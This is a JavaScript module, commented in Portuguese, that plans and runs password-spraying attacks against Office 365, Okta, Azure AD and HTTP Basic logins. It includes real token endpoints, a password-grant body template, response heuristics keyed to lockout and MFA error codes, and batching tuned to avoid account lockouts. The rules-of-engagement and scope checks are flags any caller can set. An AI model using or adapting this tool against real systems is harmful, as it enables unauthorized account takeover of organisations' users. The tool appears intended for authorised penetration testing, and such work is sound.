/**
 * Credential spray — lógica de planejamento e gating duríssimo.
 *
 * NUNCA dispara HTTP por si só. O planner gera attempts em ordem segura
 * (1 senha × N usuários por janela), respeita lockout/cooldown, e EXIGE:
 *
 *   - engagement com `roeSigned: true`
 *   - janela temporal explícita (engagement.window)
 *   - confirm explícito do operador
 *
 * Suporta presets de endpoint (Office365, Okta, Azure AD) — só metadados,
 * sem chamadas embutidas.
 */

export const ENDPOINT_PRESETS = {
  o365: {
    id: 'o365', name: 'Office 365 (REST)',
    url: 'https://login.microsoft.com/common/oauth2/token',
    method: 'POST',
    bodyTemplate: 'resource=https%3A%2F%2Fgraph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&grant_type=password&username={user}&password={pass}&scope=openid',
    successHeuristic: (resp) => resp?.status === 200 && /access_token/.test(String(resp?.body || '')),
    lockoutHeuristic: (resp) => /AADSTS50053|locked/i.test(String(resp?.body || '')),
    mfaHeuristic: (resp) => /AADSTS50076|AADSTS50079/i.test(String(resp?.body || '')),
  },
  okta: {
    id: 'okta', name: 'Okta /api/v1/authn',
    url: '<okta-org>/api/v1/authn',
    method: 'POST',
    bodyTemplate: '{"username":"{user}","password":"{pass}"}',
    successHeuristic: (resp) => resp?.status === 200 && /SUCCESS|MFA_REQUIRED/.test(String(resp?.body || '')),
    lockoutHeuristic: (resp) => /LOCKED_OUT/i.test(String(resp?.body || '')),
    mfaHeuristic: (resp) => /MFA_REQUIRED|MFA_ENROLL/.test(String(resp?.body || '')),
  },
  'azure-ad-graph': {
    id: 'azure-ad-graph', name: 'Azure AD (Graph)',
    url: 'https://graph.microsoft.com/v1.0/me',
    method: 'GET',
    successHeuristic: (resp) => resp?.status === 200,
    lockoutHeuristic: () => false,
    mfaHeuristic: () => false,
  },
  basic: {
    id: 'basic', name: 'HTTP Basic genérico',
    url: '<custom>', method: 'GET',
    successHeuristic: (resp) => resp?.status === 200,
    lockoutHeuristic: (resp) => resp?.status === 423,
    mfaHeuristic: () => false,
  },
};

function nowMs() { return Date.now(); }

/**
 * Verifica se o engagement permite spray. Retorna {ok, reason}.
 */
export function gateSpray({ engagement, confirm = false, target = null } = {}) {
  if (!engagement) return { ok: false, reason: 'requer engagement' };
  if (!engagement.roeSigned) return { ok: false, reason: 'ROE não assinado' };
  if (!engagement.window || !engagement.window.startsAt || !engagement.window.endsAt) {
    return { ok: false, reason: 'engagement requer window.startsAt e window.endsAt' };
  }
  const now = new Date();
  const start = new Date(engagement.window.startsAt);
  const end = new Date(engagement.window.endsAt);
  if (now < start || now > end) return { ok: false, reason: `fora da janela (${engagement.window.startsAt} → ${engagement.window.endsAt})` };
  if (!confirm) return { ok: false, reason: 'requer --confirm-active' };
  if (target && Array.isArray(engagement.scopeDomains) && engagement.scopeDomains.length) {
    const inScope = engagement.scopeDomains.some((d) => {
      if (d.startsWith('*.')) return target.endsWith(d.slice(2));
      return target === d;
    });
    if (!inScope) return { ok: false, reason: `target ${target} fora de escopo` };
  }
  return { ok: true };
}

/**
 * Plan attempts: 1 senha × usuários, com cooldown entre lotes.
 * Devolve generator de batches (operador chama executor por attempt).
 */
export function planSpray({
  users = [], passwords = [], usersPerBatch = 25,
  cooldownMs = 120_000, // 2 min entre senhas (anti-lockout)
  attemptDelayMs = 1500, // 1.5s entre attempts
  maxTotal = 5000,
}) {
  const batches = [];
  let total = 0;
  for (const pass of passwords) {
    for (let i = 0; i < users.length; i += usersPerBatch) {
      const slice = users.slice(i, i + usersPerBatch);
      const attempts = slice.map((u) => ({ user: u, password: pass }));
      total += attempts.length;
      if (total > maxTotal) break;
      batches.push({ password: pass, attempts });
    }
  }
  return {
    batches,
    cooldownMs,
    attemptDelayMs,
    estimateMs: batches.length * cooldownMs + batches.reduce((s, b) => s + b.attempts.length * attemptDelayMs, 0),
    estimateTotal: total,
  };
}

/**
 * Executa o plano usando executor injetado.
 * executor({ url, method, body, headers, attempt }) → Promise<{ status, body, headers }>
 *
 * Aborta se hit de lockout supera threshold (`lockoutAbortRatio`) num batch.
 */
export async function runSpray({ plan, preset, customExecutor, target, lockoutAbortRatio = 0.2, onAttempt = null }) {
  if (!ENDPOINT_PRESETS[preset?.id || preset]) throw new Error(`preset ${preset} desconhecido`);
  const p = typeof preset === 'string' ? ENDPOINT_PRESETS[preset] : preset;
  if (typeof customExecutor !== 'function') throw new Error('runSpray: customExecutor obrigatório');

  const out = { successes: [], lockouts: [], mfa: [], errors: [], aborted: false, abortReason: null };
  for (const batch of plan.batches) {
    let lockHits = 0;
    for (const attempt of batch.attempts) {
      const url = (p.url || '').replace('<okta-org>', target || '').replace('<custom>', target || '');
      const body = (p.bodyTemplate || '')
        .replace('{user}', encodeURIComponent(attempt.user))
        .replace('{pass}', encodeURIComponent(attempt.password));
      const start = nowMs();
      let resp;
      try { resp = await customExecutor({ url, method: p.method, body, attempt }); }
      catch (e) { out.errors.push({ ...attempt, error: e?.message || String(e) }); }
      const took = nowMs() - start;
      const cls = classifyResponse(resp, p);
      if (onAttempt) await onAttempt({ ...attempt, response: resp, classification: cls, ms: took });
      if (cls === 'success') out.successes.push({ ...attempt, response: pickResp(resp) });
      else if (cls === 'mfa') out.mfa.push({ ...attempt, response: pickResp(resp) });
      else if (cls === 'lockout') { out.lockouts.push({ ...attempt, response: pickResp(resp) }); lockHits++; }
      await sleep(plan.attemptDelayMs);
      if (lockHits / batch.attempts.length > lockoutAbortRatio) {
        out.aborted = true;
        out.abortReason = `lockout ratio > ${lockoutAbortRatio} no batch (password=${batch.password})`;
        return out;
      }
    }
    await sleep(plan.cooldownMs);
  }
  return out;
}

function classifyResponse(resp, p) {
  if (!resp) return 'error';
  if (p.lockoutHeuristic && p.lockoutHeuristic(resp)) return 'lockout';
  if (p.mfaHeuristic && p.mfaHeuristic(resp)) return 'mfa';
  if (p.successHeuristic && p.successHeuristic(resp)) return 'success';
  return 'fail';
}

function pickResp(resp) {
  return resp ? { status: resp.status, hint: String(resp.body || '').slice(0, 200) } : null;
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
